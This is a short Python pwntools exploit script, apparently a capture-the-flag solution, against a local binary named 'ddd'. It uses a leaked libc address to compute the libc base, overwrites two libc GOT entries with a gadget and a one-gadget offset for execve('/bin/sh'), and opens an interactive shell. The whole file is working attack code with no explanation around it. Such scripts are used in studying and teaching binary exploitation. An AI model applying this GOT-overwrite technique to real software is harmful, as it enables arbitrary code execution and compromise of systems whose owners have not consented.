#!/usr/bin/python3
from pwn import process, p64

shell = process("./ddd")

shell.recvuntil(b": ")
libc_base = int(shell.recvline().strip(), 16) - 0x21a780

shell.sendlineafter(b">> ", str(libc_base + 0x219098).encode()) # __strlen_evex@got
shell.sendafter(b": ", p64(libc_base + 0x88630))                # mov rdx, r12; call __mempcpy_evex_unaligned_erms@got

shell.sendlineafter(b">> ", str(libc_base + 0x219040).encode()) # __mempcpy_evex_unaligned_erms@got
shell.sendafter(b": ", p64(libc_base + 0xebcf8))                # execve("/bin/sh", rsi, rdx);

shell.interactive()
